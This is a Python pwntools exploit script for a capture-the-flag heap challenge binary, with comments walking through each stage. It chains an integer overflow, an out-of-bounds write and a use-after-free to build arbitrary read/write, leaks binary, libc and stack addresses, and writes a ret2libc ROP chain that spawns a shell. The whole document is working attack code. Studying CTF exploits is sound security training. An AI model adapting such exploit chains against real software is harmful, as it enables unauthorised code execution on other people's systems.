#!/usr/bin/env python3

from pwn import * 

context.arch = 'amd64'
context.os   = 'linux'

BINARY            = './chall'
LIBC              = './libc.so.6'
LD                = './ld-linux-x86-64.so.2'
RPATH             = '.'

FEEDBACK_DEC      = 0x1d0
JUNK              = b'JUNK'
CONTROL_ITEM      = 0x69
LEAK_STORAGE_SLOT = 0x03
ROP_OFFSET        = -0x130

def patch(binary, ld, rpath):
  patched = f'{binary}.patched'
  if not os.path.exists(patched):
    os.system(f'cp "{binary}" "{patched}"')
    os.system(f'patchelf --set-interpreter "{ld}" "{patched}"')
    os.system(f'patchelf --set-rpath "{rpath}" "{patched}"')
  return patched

def start():
  if args.LOCAL:
    return process(patch(BINARY, LD, RPATH))
  else:
    return remote(sys.argv[1], int(sys.argv[2]))

def leak64(b):
  return u64(b.ljust(8, b'\x00')[:0x08])

def add_storage(*items, desc=JUNK):
  io.sendlineafter(b'> ', b'1')
  io.sendlineafter(b': ', desc)
  for i in items[:-1]:
    io.sendlineafter(b': ', i)
    io.sendline(b'y')
  io.sendlineafter(b': ', items[-1])
  io.sendline(b'n')

def update_item(itemid, new_content):
  io.sendlineafter(b'> ', b'2')
  io.sendlineafter(b': ', str(itemid).encode())
  io.sendlineafter(b': ', new_content)

def update_item2(itemid):
  io.sendlineafter(b'> ', b'2')
  io.sendlineafter(b': ', str(itemid).encode())

def delete_item(itemid):
  io.sendlineafter(b'> ', b'3')
  io.sendlineafter(b': ', str(itemid).encode())

def leave_feedback(feedback=JUNK):
  io.sendlineafter(b'> ', b'4')
  io.sendlineafter(b': ', feedback)

def show_feedback():
  io.sendlineafter(b'> ', b'4')
  io.recvuntil(b'feedback: "')
  feedback = io.recvuntil(b'"\n').split(b'"\n')[0]
  io.sendline(b'n')
  return feedback
  
def change_feedback(new_feedback):
  io.sendlineafter(b'> ', b'4')
  io.sendline(b'y')
  io.sendlineafter(b': ', new_feedback)

def finish():
  io.sendlineafter(b'> ', b'5')

def xploit():

  global io
  io = start()

  # *** HEAP FENG SHUI ****

  # Prepare #000 storage
  # We need to free it and reuse
  # We need to force program to reuse `storages_arr[0x00]` chunk for `feedback`
  # It will be basis of our future Use-After-Free exploitation

  items = [JUNK] * 3
  add_storage(*items)

  for i in range(3):
    delete_item(i)

  leave_feedback()

  # *** USE AFTER FREE ***

  # We haeve `feedback == storages_arr[0x00]`
  # Changes of `storages_arr[0x00]->nitems`
  # -> Changes of `feedback->content` pointer

  # Decrement `feedback->content` by `dec`
  def uaf_dec_once(dec):
    assert(dec <= 0x100)
    # We use chain of 3 bugs
    # Integer-Overflow (`add_storage`)
    #        | |
    #       \   /
    #        \ /
    # Out-Of-Bound-Write (`update_item`)
    #        | |
    #       \   /
    #        \ /
    # Use-After-Free (`delete_item`)

    # First, prepare items with `item->sz == 0x00`
    # `item->sz` is `uint8_t`
    # -> `item-sz = strlen(dest) + 1` can be zero (Integer-Overflow)
    # Items with real size `0xFF + 0x100 * N` will have `item->sz == 0x00`
    items = [b'A'*0xFF] * dec
    add_storage(*items)
    for i in range(dec):

      # Next, `item->sz == 0x00`
      # -> `read` in update returns `0x00`
      # -> `item->desc[-1] = 0x00` (Out-Of-Bound-Write)
      # Actually, it means `item->storage_id = 0x00`
      update_item2(i)

      # Finally, delete of `item` with `item->storage_id == 0x00`
      # -> `storages_arr[0x00]->nitmes--` (Use-After-Free)
      # `storage_arr[0x00] == feedback` 
      # -> we can decrement `feedback->content`
      # We abuse Use-After-Free to change `feedback->content` pointer
      delete_item(i)

  # Previous function can't be used for decrements larger than 0x100
  # So, we need to build this one on top of `uaf_dec_once`
  def uaf_dec(dec):
    while dec >= 0x100:
      uaf_dec_once(0x100)
      dec -= 0x100
    uaf_dec_once(dec)

  # We can use `uaf_dec` to get `feedback->content == &feedback->content`
  # FEEDBACK_DEC value can be easily found in debugger
  # It is distance between `feedback` and `feedback->content` chunks
  uaf_dec(FEEDBACK_DEC)

  # Now, we have kind of Ouroboros: `feedback->content` points to itself
  # We'll use it later to both leak `&feadback->content` and change it

  # *** LEAKS ***

  # We use unitialized variable in `menu` to leak binary address
  # Main loop calls `menu` after `add_storage` 
  # -> Stack variable holds `storage_slot` address
  # `scanf` fails -> `menu` returns `storage_slot` untouched
  # `storage_slot` are printed as "Bad option"
  items = [JUNK]
  add_storage(*items)
  io.sendlineafter(b'> ', b'give_me_leak')
  io.recvuntil(b'Bad option: ')
  binary_leak = int(io.recvline().decode())
  log.debug(f'binary leak @ {binary_leak:#x}')

  binary = ELF(BINARY)
  binary_leak_offset = binary.symbols['storages_arr'] + LEAK_STORAGE_SLOT * 0x08
  binary.address     = binary_leak - binary_leak_offset
  log.debug(f'binary @ {binary.address:#x}')

  # Leak `feedback` (`&feedback->content`) from `feedback->content`
  feedback = leak64(show_feedback())
  log.debug(f'feedback @ {feedback:#x}')

  # *** AARW ***

  # Set `feedback->content` to `&items_arr[CONTROL_ITEM]`
  change_feedback(p64(binary.symbols['items_arr'] + CONTROL_ITEM * 0x08))
  # Set `items_arr[CONTROL_ITEM]` to `&feedback->content - 0x08`
  # -0x08 here is required to "fake" `item` with valid `item->sz` 
  # `item->sz == 0x21` - low byte of chunk header
  change_feedback(p64(feedback - 0x08))

  # We use `CONTROL_ITEM` to write any address to the `feedback->content`
  # We can read/write anything to the `feedback->content` address 
  # -> We have AARW

  # Arbitrary Address Read
  def aar(address):
    # Write address to `feedback->content`
    update_item(CONTROL_ITEM, b'X'*6 + p64(address))
    # Read `feedback->content` (our address)
    return show_feedback()

  # Arbitrary Address Write
  def aaw(address, data):
    # Same as `aar`
    update_item(CONTROL_ITEM, b'X'*6 + p64(address))
    change_feedback(data)

  # *** ROP-N-ROLL ***

  # We need to gain code execution using unlimited AARW
  # Here is default way to do it:

  # 1. Leak libc from binary's GOT
  read   = leak64(aar(binary.got['read']))
  libc   = ELF('./libc.so.6')
  libc.address = read - libc.symbols['read']
  log.debug(f'libc @ {libc.address:#x}')

  # 2. Leak stack from libc's environ
  stack = leak64(aar(libc.symbols['environ'])) + ROP_OFFSET
  log.debug(f'stack @ {stack:#x}')

  # 3. Write ret2libc ROP-chain at the stack
  rop = ROP(libc)
  rop.raw(rop.ret.address)
  rop.call(libc.symbols['system'], (next(libc.search(b'/bin/sh\x00')),))
  aaw(stack, rop.chain())

  # 4. rop-n-roll
  finish()

  # 5. Enjoy shell
  io.sendline(b'echo s41nt0l3xus')
  io.recvuntil(b's41nt0l3xus\n')
  io.interactive()

if __name__ == '__main__':
  xploit()
